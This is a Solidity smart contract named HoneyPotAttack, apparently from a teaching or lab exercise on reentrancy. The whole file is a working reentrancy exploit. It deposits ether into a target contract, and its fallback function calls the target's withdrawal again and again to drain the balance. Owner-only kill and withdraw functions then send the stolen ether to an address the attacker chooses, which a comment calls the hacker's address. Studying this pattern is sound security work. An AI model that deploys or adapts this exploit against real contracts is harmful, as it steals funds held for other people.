pragma solidity ^0.5.0;

import "./HoneyPotLogic.sol";
// import "openzeppelin-solidity/contracts/ownership/Ownable.sol";

contract HoneyPotAttack {
  HoneyPotLogic public honeyPotLogic;
  uint256 private _iteration;
  uint256 private _maxIterations;
  address private _owner;
  constructor (address payable _honeyPotLogic) public {
    // pass an address will be the honeyPotLogic
    honeyPotLogic = HoneyPotLogic(_honeyPotLogic);
    _owner = msg.sender;
  }

  function getOwner() public view returns (address __owner) {
    __owner = _owner;
  }

  /**
    * @dev Throws if called by any account other than the owner.
    */
  modifier onlyOwner() {
      require(msg.sender == _owner, "Ownable: caller is not the owner");
      _;
  }

  // to get the collected ether to an address of hacker
  // mechanism to destroy the honeyPotLogicCollect and send all ether containing in it to the address
  function kill (address payable killAddress) public onlyOwner {
    selfdestruct(killAddress);
  }


  // set the reentrancy attack in motion. It puts some ether in honeyPotLogic
  function collect(uint256 maxIterations) payable public onlyOwner {
    _iteration = 0;
    _maxIterations = maxIterations;

    honeyPotLogic.put.value(msg.value)();
    honeyPotLogic.get();
  }

  function withdraw(address payable withdrawAddress, uint256 withdrawAmount)
  public onlyOwner
  {
      require(address(this).balance > withdrawAmount, "not enough funds");

      withdrawAddress.transfer(withdrawAmount);
  }
  // the fallback function is called whenever the honeyPotLogicCollect contract receives ether
  function () payable external {
    if (address(honeyPotLogic).balance >= msg.value && _iteration < _maxIterations) 
        {
            _iteration += 1;

            honeyPotLogic.get();
        }
  }
}
